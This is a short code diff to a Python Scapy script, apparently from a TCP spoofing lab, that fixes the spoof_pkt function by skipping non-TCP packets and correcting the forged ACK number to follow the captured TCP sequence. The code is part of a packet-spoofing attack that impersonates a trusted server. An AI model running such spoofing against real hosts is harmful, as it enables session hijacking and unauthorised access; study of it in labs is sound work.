@@ -10,6 +10,9 @@ SRV_PORT = 1023  # Port used by trusted server
 
 
 def spoof_pkt(pkt):
+    if IP not in pkt or TCP not in pkt:
+        return
+
     seq = 123456789 + 1
     old_ip = pkt[IP]
     old_tcp = pkt[TCP]
@@ -35,7 +38,7 @@ def spoof_pkt(pkt):
             dport=X_PORT,
             flags="A",
             seq=seq,
-            ack=old_ip.seq + 1,
+            ack=old_tcp.seq + 1,
         )
         send(ip / tcp, verbose=0)
 
